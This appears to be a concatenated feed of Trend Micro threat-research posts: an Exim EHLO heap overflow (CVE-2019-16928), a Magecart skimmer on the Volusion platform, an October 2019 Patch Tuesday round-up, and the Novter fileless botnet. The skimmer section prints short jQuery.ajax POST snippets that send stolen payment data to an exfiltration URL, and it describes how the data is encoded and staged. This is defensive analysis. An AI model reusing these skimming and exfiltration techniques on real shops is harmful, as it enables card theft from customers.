Exim accounts for <a href=\"http://www.securityspace.com/s_survey/data/man.201909/mxsurvey.html\">over 50%</a> of publicly reachable mail servers on the internet. What makes the bug particularly noteworthy is that threat actors could exploit it to perform denial of service (DoS) or possibly even remote code execution attacks (RCE) — making it a serious concern for Exim customers who use vulnerable versions of the software.</p>\n<p>The flaw exists in the following Exim versions (earlier versions are not affected):</p>\n<ul>\n<li>4.92</li>\n<li>4.92.1</li>\n<li>4.92.2.</li>\n</ul>\n<p>In this entry, we explain how CVE-2019-16928 can be exploited, specifically, how introducing a heap-based buffer overflow error to the Exim process can be used to gain execution control of it.</p>\n<h3><strong>The heap overflow</strong></h3>\n<p>During execution in computer memory, local variables are stored in an area of the memory called the stack, which is responsible for storing local variables created by a function. On the other hand, dynamic variables, which are used to allocate and free memory during runtime, are stored in another area of the memory called the heap.</p>\n<p>Each local variable points to its value in the heap, which basically means that it points to its memory address containing the value. When a string longer than the dedicated memory is used as an input, it overrides and changes the value in subsequent memory blocks in the heap. Figure 1 depicts this execution flow.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-01.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-01.jpg\" alt=\"Figure 1. Memory representation during heap buffer overflow\" width=\"500\" /></a></p>\n<p align=\"center\">Figure 1. Memory representation during heap buffer overflow</p>\n<p>In this scenario, <em>Value 2</em> can be any string or backdoor command which can be executed during runtime — a process widely known as remote code execution.</p>\n<h3><strong>Using EHLO strings to exploit the vulnerability</strong></h3>\n<p>As defined by the Internet Engineering Task Force (IETF), the Extended HELO (EHLO) is a command sent by the email client to identify itself and inform the email server that it will use Extended Simple Mail Transfer Protocol (ESMTP) before starting the process of sending an email. It is through EHLO strings that a threat actor could exploit CVE-2019-16928 to perform malicious attacks, such as crashing the Exim process (resulting in DoS). Furthermore, a backdoor command used as an input for EHLO could lead to remote code execution.</p>\n<p>This vulnerability is found in the method string_vformat() in string.c. Due to a coding error, the length of the string was not growing by enough, leading to a buffer overflow anomaly. The growth of the string is fixed by <a href=\"https://git.exim.org/exim.git/blobdiff/bcbca153505de435c881e71297fde83c3ac02cc1..478effbfd9c3cc5a627fc671d4bf94d13670d65f:/src/src/string.c\">adding size from the offset value</a>.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-02.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-02.jpg\" alt=\" Figure 2. gstring_grow() invocation which allocates more memory to string\" width=\"500\" /></a></p>\n<p align=\"center\">Figure 2. gstring_grow() invocation which allocates more memory to string</p>\n<p>As seen in Figure 2, the statement highlighted in red is the flaw in the code. If the difference between g-&gt;ptr (the current pointer in string or offset) and (lim &#8211; g-&gt;ptr) is unreasonably low and the size of the appended string is larger than the allocated memory, then it can lead to heap overflow. A simple fix is found in the next statement.</p>\n<h3><strong>Recommendations and Trend Micro solutions</strong></h3>\n<p>As of the time of writing, Exim has already released an update (version <a href=\"https://ftp.exim.org/pub/exim/exim4/\">4.92.3</a>) that includes fixes for CVE-2019-16928. To prevent any possible issues that might arise from the exploitation of the vulnerability, Exim users should update their software to the latest version.</p>\n<p>To strengthen overall security posture further, organizations can also look into security software such as the <a href=\"https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/\">Trend Micro</a><img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/\">Deep Discovery</a><img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> solution, which provides detection and in-depth analysis through specialized engines, custom <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/deploying-a-smart-sandbox-for-unknown-threats-and-zero-day-attacks/\">sandboxing</a>, and seamless correlation across the entire attack life cycle, allowing it to detect vulnerability-exploiting attacks even without engine or pattern updates.</p>\n<p>This technology also includes the Trend Micro <a href=\"https://www.trendmicro.com/en_ca/business/products/network/deep-discovery/inspector.html\">Deep Discovery Inspector</a>, which protects customers from attacks that exploit CVE-2019-16928 via the following rule:</p>\n<ul>\n<li>Rule ID 4246: Possible CVE-2019-16928 &#8211; Exim Buffer Overflow Exploit &#8211; SMTP (Request)</li>\n</ul>\n<p>The <a href=\"https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html\">Trend Micro<img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> Deep Security<img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></a>  solution also protect systems and users from threats targeting CVE-2019-16928 via the following Deep Packet Inspection (DPI) rule:</p>\n<ul>\n<li>1010010 &#8211; Exim Remote Code Execution Vulnerability (CVE-2019-16928)</li>\n</ul>\n<p><a href=\"https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/tipping-point-threat-protection-system.html\">Trend Micro<img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> TippingPoint®</a> customers are protected from threats and attacks that may exploit this vulnerability via the following <a href=\"https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/threat-intelligence.html\">MainlineDV</a> filter:</p>\n<ul>\n<li>36283: SMTP: Exim Buffer Overflow Vulnerability</li>\n</ul>\n<p>The post <a rel=\"nofollow\" href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/\">CVE-2019-16928: Exploiting an Exim Vulnerability via EHLO Strings</a> appeared first on <a rel=\"nofollow\" href=\"https://blog.trendmicro.com/trendlabs-security-intelligence\"></a>.</p>\n<div class=\"feedflare\">\n<a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:V_sGLiPBpWU\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:gIN9vFwOqvQ\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174\" border=\"0\"></img></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/I018LVDhP1I\" height=\"1\" width=\"1\" alt=\"\"/>",

Our data shows that the attack started on September 7, 2019. All of the impacted online shops are hosted on the cloud platform of the e-commerce service provider “Volusion,” one of the <a href=\"https://www.ecommerceceo.com/ecommerce-platforms/\" target=\"_blank\" rel=\"noopener noreferrer\">top e-commerce platforms</a> in the market. This is actually the third time we have identified a card skimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already victimized this year: a <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/mirrorthief-group-uses-magecart-skimming-attack-to-hit-hundreds-of-campus-online-stores-in-us-and-canada/\" target=\"_blank\" rel=\"noopener noreferrer\">campus</a> e-commerce platform and a <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/\" target=\"_blank\" rel=\"noopener noreferrer\">hotel</a> e-commerce platform. These targets are obviously appealing to cybercriminals since they are connected to multiple — in this most recent case, thousands of — online shops.</p>\n<p>We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code loaded another JavaScript stored on a <a href=\"https://cloud.google.com/storage/\" target=\"_blank\" rel=\"noopener noreferrer\">Google Storage</a> service. The loaded script is almost a direct copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information, the skimmer will copy and send the personal information and credit card details to an exfiltration server belonging to the attackers.</p>\n<p>Our team contacted Google and they have removed the file. The attack is currently offline. As of publication, Volusion has <a href=\"https://twitter.com/Volusion/status/1181652914340798467\" target=\"_blank\" rel=\"noopener noreferrer\">acknowledged</a> and <a href=\"https://twitter.com/Volusion/status/1181661671674335232?s=20\" target=\"_blank\" rel=\"noopener noreferrer\">fixed the issue</a>.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-1.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-1.jpg\" alt=\"Figure. 1\" width=\"600\" /></a></p>\n<p style=\"text-align: center\">Figure 1.

They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the code into the original script to be part of the execution flow of the program. The code was also written as simply as possible, making it difficult to be identified in a big library. Furthermore, they registered the domain of their exfiltration server in a similar style to a legitimate Volusion domain.</p>\n<p>Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been <a href=\"https://twitter.com/ydklijnsma/status/1167837317232377856\" target=\"_blank\" rel=\"noopener noreferrer\">identified</a> as the notorious threat actor <a href=\"https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/\" target=\"_blank\" rel=\"noopener noreferrer\">FIN6</a>. We found similarities in the code used in this attack and the code used in FIN6’s previous attacks on <a href=\"https://www.riskiq.com/blog/labs/magecart-british-airways-breach/\" target=\"_blank\" rel=\"noopener noreferrer\">British Airways</a> and <a href=\"https://www.riskiq.com/blog/labs/magecart-newegg/\" target=\"_blank\" rel=\"noopener noreferrer\">Newegg</a>.</p>\n<p><em><strong>Analysis of the code injection</strong></em></p>\n<p>The attackers injected their code into a library provided on Volusion’s e-commerce platform for their client shops. The script, described by the comments on the library, includes the necessary code for the pop-out feature of the shop’s navigation menu. It was also used on the shop checkout page. The script is located at:</p>\n<p>• hxxps://[online shop domain]/a/j/vnav.js</p>\n<p>The attackers didn’t just inject their code inside the library. They also integrated their code into the original function of <a href=\"https://jqueryui.com/\" target=\"_blank\" rel=\"noopener noreferrer\">jQueryUI</a> code to be executed with the original execution flow. They created a new object “e.widget.unbridge” right before the original object “e.widget.bridge” and the malicious code is inside the new object. It’s worth noting that the attackers even wrote their malicious code in a similar coding style to make it look more like a part of the original source code.</p>\n<p>The injected object will create a new script element to load another remote script stored on Google Storage.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-3.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-3.png\" alt=\"Figure. 3\" width=\"700\" /></a></p>\n<p style=\"text-align: center\">Figure 3.

Comparison of the original Volusion script (left) and the script with injection (right); the injected malicious code is highlighted</p>\n<p style=\"text-align: left\"><strong>Analysis of the credit card skimmer</strong></p>\n<p>The loaded remote script is on Google Storage:</p>\n<p>• hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js</p>\n<p>Much of the code inside the script is from the library “<a href=\"https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.js\" target=\"_blank\" rel=\"noopener noreferrer\">js-cookie</a>” version 2.2.1. However, the attackers modified it and integrated a credit card skimmer into the original script. The skimmer binds at the events <a href=\"https://api.jquery.com/mousedown/\" target=\"_blank\" rel=\"noopener noreferrer\">“mousedown”</a> and <a href=\"https://www.w3schools.com/jsref/event_touchstart.asp\" target=\"_blank\" rel=\"noopener noreferrer\">“touchstart”</a> of the payment submit button.</p>\n<p>This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be triggered and the skimmer will be executed.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-5.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-5.png\" alt=\"Figure. 5\" width=\"700\" /></a></p>\n<p style=\"text-align: center\">Figure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js-cookie” library (right)</p>\n<p>The skimmer copies the information on the entire payment form: the victim’s name, address, phone number, email address, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number).</p>\n<p>Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then, it performs a character permutation on the encoded string to make sure it can’t be directly decoded with Base64 decoding.</p>\n<p>The data will then be stored in <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage\" target=\"_blank\" rel=\"noopener noreferrer\">sessionStorage</a> with the key “__utmz_opt_in_out”. The next time the skimmer is loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to send the stolen payment information to a remote server at “hxxps[:]//volusion-cdn[.]com/analytics/beacon” for exfiltration.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-6.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-6.png\" alt=\"Figure. 6\" width=\"700\" /></a></p>\n<p style=\"text-align: center\">Figure 6. Main script of the credit card skimmer</p>\n<p>Note that the attackers used the domain “volusion-cdn[.]com” for their exfiltration server, a similar name to Volusion’s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also running its <a href=\"https://cloud.google.com/customers/volusion/\" target=\"_blank\" rel=\"noopener noreferrer\">service</a> on the Google Cloud Platform.</p>\n<p><em><strong>Evidence of Magecart or FIN6</strong></em></p>\n<p>As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known as the threat actor FIN6. Here are the connections we considered:</p>\n<ul>\n<li>Group 6 is known to only target top-tier victims, investing in scams where they can receive a big payoff from one attack. This single hack of Volusion allows them to receive credit card data from 3,126 online shops.</li>\n<li>From the previous skimming attack on the British Airways and Newegg websites, we know that Group 6 tried to register the domains of the exfiltration server to be similar to the victims’ domains. In this case, the domain of the exfiltration server is “volusion-cdn[.]com” — very similar to the valid domain “cdn3[.]volusion[.]com” from Volusion.

Both old and current skimmers are written with jQuery, serialize the stolen data, and use the jQuery.ajax function to POST data to a remote server. Although the older skimmer is much simpler compared to the current one, it didn’t encode the stolen data or store the data in sessionStorage before the exfiltration.</li>\n</ul>\n<table>\n<tbody>\n<tr>\n<td width=\"112\"><strong>Target</strong></td>\n<td width=\"440\"><strong>Script of data exfiltration request</strong></td>\n</tr>\n<tr>\n<td width=\"112\">British Airways</td>\n<td width=\"440\">jQuery.ajax({type:&#8221;POST&#8221;,async:0,url:”[exfiltration url]”,data:t,dataType:&#8221;application/json})</td>\n</tr>\n<tr>\n<td width=\"112\">Newegg</td>\n<td width=\"440\">jQuery.ajax({type:&#8221;POST&#8221;,async:true,url:”[exfiltration url]”,data:pdati,dataType:&#8221;application/json})</td>\n</tr>\n<tr>\n<td width=\"112\">Volusion</td>\n<td width=\"440\">$.ajax({type: &#8216;POST&#8217;,url: &#8216;[exfiltration url]&#8217;,dataType: &#8216;application/x-www-form-urlencoded&#8217;,data: d,complete: function() { window.sessionStorage.removeItem(&#8216;__utmz_opt_in_out&#8217;); }})</td>\n</tr>\n</tbody>\n</table>\n<p>It’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart” of the payment submit button.

However, this shorter list still warrants attention. Nine of the 59 were still identified as Critical, while the remaining 50 were labeled Important. Most of the critical bulletins were for various Internet Explorer and Microsoft Edge vulnerabilities, with one covering a Remote Desktop Client vulnerability. The Important bulletins fixed several issues, including NTLM and Microsoft IIS server vulnerabilities.</p>\n<p>Here’s a closer look at the notable vulnerabilities patched this month:</p>\n<p><strong>Remote Desktop Client</strong></p>\n<p><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1333\">CVE-2019-1333</a> covered a remote code execution (RCE) vulnerability in Microsoft’s Remote Desktop Client. However, for an attacker to successfully exploit and gain remote access to a targeted system using this vulnerability they must have the user access their malicious RDP server, which may involve some use of social engineering.</p>\n<p><strong>Browser vulnerabilities</strong></p>\n<p><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1060\">CVE-2019-1060</a>, <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1238\">CVE-2019-1238</a>, and <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1239\">CVE-2019-1239</a> are vulnerabilities found in how the VBScript engine of Internet Explorer handles objects in memory. <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1307\">CVE-2019-1307</a>, <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1308\">CVE-2019-1308</a>, <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1335\">CVE-2019-1335</a>, and <a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1366\">CVE-2019-1366</a> are similar vulnerabilities in the Chakra scripting engine of Microsoft Edge.</p>\n<p>For both cases, a hacker can use these vulnerabilities to corrupt memory in a way that would make it possible to run arbitrary code with the same rights as the user. These vulnerabilities allow an attacker to gain the same privileges as the logged on user.</p>\n<p><strong>Authentication vulnerabilities</strong></p>\n<p><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1166\">CVE-2019-1166</a> is a tampering vulnerability in Microsoft’s <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm\">NTLM</a> authentication protocol. This vulnerability could allow a possible man-in-the-middle (MITM) attacker to bypass protection mechanisms employed by NTLM called Message Integrity Check (MIC) and downgrade its security features. This is done <em>without</em> the signature of the NTLM packet becoming invalid.</p>\n<p><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1338\">CVE-2019-1338</a> is a security feature bypass vulnerability where a MitM attack could bypass NTLMv2 protection if the client is also sending out LMv2 responses. A successful exploit of this vulnerability could allow an attacker to downgrade NTLM security features, but they would need to modify NTLM traffic exchange to do so.</p>\n<p><strong>Microsoft IIS Server</strong></p>\n<p><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1365\">CVE-2019-1365</a> is an elevation of privilege vulnerability that could allow a potential attacker to perform cross-site scripting and run scripts in the same security context as the user. This vulnerability exists because of instances where the Microsoft IIS server inadequately sanitizes a specially crafted request.</p>\n<p><strong>Trend Micro solutions</strong></p>\n<p>Users with affected installations are advised to prioritize the updates in order to avoid possible system exploitation through unpatched vulnerabilities.

Chen (Threat Researchers)</strong></em></p>\n<p>We found a new modular fileless botnet malware, which we named “Novter,” (also reported and known as “<a href=\"https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/\">Nodersok</a>” and “<a href=\"https://blog.talosintelligence.com/2019/09/divergent-analysis.html\">Divergent</a>”) that the KovCoreG campaign has been distributing since March. We’ve been actively monitoring this threat since its emergence and early development, and saw it being frequently updated. <a href=\"https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-kovcoreg-kovter-saga\">KovCoreG</a>, active since 2011, is a long-running campaign known for using the <a href=\"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/kovter-an-evolving-malware-gone-fileless\">Kovter</a> botnet malware, which was distributed mainly through malvertisements and <a href=\"https://www.trendmicro.com/vinfo/us/security/definition/exploit-kit\">exploit kits</a>. Kovter has been involved in click fraud operations since 2015, using fraudulent ads that have reportedly cost businesses more than <a href=\"https://www.justice.gov/usao-edny/pr/two-international-cybercriminal-rings-dismantled-and-eight-defendants-indicted-causing\">US$29 million</a>. The botnet was <a href=\"https://www.whiteops.com/3ve\">taken down</a> at the end of 2018 through concerted efforts by law enforcement and cybersecurity experts, including Trend Micro.</p>\n<p>The dismantlement hasn’t deterred the cybercriminals. Though the botnet is dead, we noticed that the KovCoreG campaign didn’t stop their activities and instead developed another botnet. Working with ProofPoint’s threat researcher <a href=\"https://twitter.com/kafeine\">Kafeine</a>, we were able to uncover a new fileless botnet malware — Novter — being distributed by the operators of KovCoreG.</p>\n<p>While the malvertising attacks were originally focused on U.S.-based users, they have since expanded to several European countries starting this summer. Our telemetry also revealed that the malvertising attacks were being distributed through a few of top 100 websites in the U.S., which were also <a href=\"https://www.proofpoint.com/us/threat-insight/post/kovter-group-malvertising-campaign-exposes-millions-potential-malware-and-fraud\">abused</a> by Kovter in their previous activities. Our analysis of Novter, particularly its most notable modules, are detailed in this <a href=\"https://documents.trendmicro.com/assets/Tech-Brief-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf\" target=\"_blank\" rel=\"noopener noreferrer\"><strong><em>technical brief</em></strong></a>.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/novter-1.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/novter-1.jpg\" alt=\"\" width=\"450\" /></a><br />\nFigure 1. Infection chain of KovCoreG, Novter, and Nodster</p>\n<h3><strong>KovCoreG’s attack chain</strong></h3>\n<p>KovCoreG’s attacks are socially engineered malvertisments that lure unwitting users into downloading a software package needed to update their supposedly out-of-date Adobe Flash application. However, it instead drops a malicious HTML application (HTA) file named <em>Player{timestamp}.hta</em>. When the victim executes the HTA file, it will load additional scripts from a remote server (communication is RC4-encrypted) and run a PowerShell script that appears to take inspiration from the open-source <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/management/Invoke-PSInject.ps1\">Invoke-PSInject</a> project.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-2.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-2.png\" alt=\"\" width=\"300\" /></a><br />\nFigure 2.

Snapshot of KovCoreG’s malvertisement traffic (captured by ProofPoint)</p>\n<p>The PowerShell script, in turn, will disable Windows Defender and Windows Update processes. It runs a shellcode to bypass User Account Control (UAC) via the <a href=\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\">CMSTPLUA</a> COM interface (related to connection management). The PowerShell script is also embedded with Novter, which will be executed <a href=\"https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-defending-against-fileless-malware#memoryexploits\">filelessly</a> via the PowerShell reflective <a href=\"https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/\">injection</a> technique.</p>\n<h3><strong>Analysis of the Novter malware</strong></h3>\n<p>Novter is a backdoor in the form of an executable file. Immediately after its execution, it performs the following anti-debugging and anti-analysis checks:</p>\n<ul>\n<li>Searching for blacklisted processes and modules by comparing the CRC32 algorithms of their names with a list of hardcoded CRC32s</li>\n<li>Checking if the number of cores is too small</li>\n<li>Checking if the process is being debugged</li>\n<li>Checking if the Sleep function is being manipulated</li>\n</ul>\n<p>If it finds any of aforementioned information, it is then reported to the C&amp;C server. Note that it uses different sets of C&amp;C servers for different purposes. One set, for instance, is solely used for anti-analysis reporting. After the affected machine’s environment is double-checked and reported, the malware goes to sleep for a long time.</p>\n<p>The backdoor commands that Novter supports are:</p>\n<ul>\n<li>killall — Terminate a process and delete a file (for all modules)</li>\n<li>kill — Terminate a process and delete a file (for a specific module)</li>\n<li>stop — Terminate the process without deleting its file (for a specific module)</li>\n<li>resume — Start a process (for a specific module)</li>\n<li>modules — Download and execute an additional module</li>\n<li>update — Download a new version and install the update</li>\n<li>update_interval — Set an interval between two consecutive update attempts</li>\n</ul>\n<p>Novter communicates with its command-and-control (C&amp;C) servers and downloads multiple JavaScript modules for different purposes. We have identified three Novter modules, which include:</p>\n<ul>\n<li>A module that shows a technical support scam page on the victim’s machine</li>\n<li>A module that abuses <a href=\"https://reqrypt.org/windivert.html\">WinDivert</a> (Windows packet divert, a tool that enables network packets sent to and from Windows network stacks to be captured, modified, or dropped) to block the communication from processes like those from antivirus (AV) software</li>\n<li>A module (which we named “Nodster”) that is written with <a href=\"https://nodejs.org/en/\">NodeJS</a> and <a href=\"https://socket.io/\">io</a> for proxying network traffic. We consider it a module responsible for building the proxy network needed to support the click fraud operations.</li>\n</ul>\n<h3><strong>Analysis of Novter’s module “Nodster”</strong></h3>\n<p>During our analysis of Novter, we came across three notable modules downloaded by the malware. One of them, which we named “Nodster,” is a network proxy module. The module installs NodeJS on the victim’s machine and executes a NodeJS script “app.js” in the background. The script will connect to an embedded C&amp;C server address and receive the second C&amp;C server address.</p>\n<p>It will then establish a backconnection to the second C&amp;C server with the socket.io protocol. The second C&amp;C server will return commands to instruct the module to make a TCP connection, send a TCP payload, and return the response from the server back to them. This turns the system infected with Novter become a proxy for the attacker to use.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-4.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-4.jpg\" alt=\"\" width=\"400\" /></a><br />\nFigure 4. The communication flow between the Nodster proxy and C&amp;C servers</p>\n<h3><strong>Correlating Nodster’s traffic</strong></h3>\n<p>During the course of our research, we observed lots of encrypted traffic proxied through the Nodster module, but we managed to decrypt some of it, which showed scripts used for web advertising. This indicates that the C&amp;C server instructed the infected machine to open a website with an embedded JavaScript code related to displaying advertisements.</p>\n<p>We also noticed that the ad traffic appeared to have been sent from Android devices, since the HTTP(S) requests transferred through the proxy had HTTP User-Agent headers from Android devices. These requests are appended with a “X-Requested-With” header with many Android app names. We inspected those apps on the Google Play store because we initially thought that the traffic could have been generated by these applications. However, we did not find any suspicious code in these applications that would have generated this traffic. We didn’t find any similar code shared between these Android applications either.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-5.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-5.png\" alt=\"\" width=\"300\" /></a><br />\nFigure 5. The HTTPS request header spoofed to be from an Android device</p>\n<p>With this finding, we inferred that the ad traffic was not coming from the mobile devices, but was instead being generated by the attacker. The attacker disguised the traffic to appear as if it was being sent from Android devices and mobile applications and proxied them through the Novter/Nodster botnet. After all, KovCoreG’s operations involved click fraud.</p>\n<h3><strong>Defending against Novter</strong></h3>\n<p>Advertisements are an innocuous online staple, but KovCoreG’s campaign demonstrates how they can be intrusive, not to mention how Novter can expose the user’s system to other and actual threats. Given how KovCoreG engages in click fraud, it can significantly affect businesses. A single <a href=\"https://www.trendmicro.com/vinfo/us/security/news/mobile-safety/mobile-ad-fraud-schemes-how-they-work-and-how-to-defend-against-them\">mobile ad fraud</a> incident in 2018, for instance, cost Google and its partners around <a href=\"https://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/2018-mobile-threat-landscape\">US$10 million</a> in losses.</p>\n<p>Novter also exemplifies fraudsters’ maturing techniques with its use of fileless infection methods and obfuscating its C&amp;C connections and fraud-related traffic. Users, for their part, should adopt best practices, especially against socially engineered threats like <a href=\"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malvertising-when-online-ads-attack\">malvertisements</a>.</p>\n<p>Trend Micro endpoint solutions, such as the <a href=\"https://www.trendmicro.com/us/business/complete-user-protection/index.html\">Smart Protection Suites</a> and <a href=\"https://www.trendmicro.com/us/small-business/product-security/\">Worry-Free Business Security</a> that have <a href=\"https://success.trendmicro.com/solution/1122593-configuring-behavior-monitoring-settings-in-apex-one\">behavior monitoring</a> capabilities, can protect users and businesses from threats like Emotet by detecting malicious files, scripts, and messages as well as blocking all related malicious URLs.  <a href=\"https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html\">Trend Micro Apex One</a><img src=\"https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png\" alt=\"™\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> protection employs a variety of threat detection capabilities such as behavioral analysis, which protect against malicious scripts, injection, ransomware, memory and browser attacks.</p>\n<p>The full details of our research on Novter is in this <a href=\"https://documents.trendmicro.com/assets/Tech-Brief-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf\" target=\"_blank\" rel=\"noopener noreferrer\"><strong><em>technical 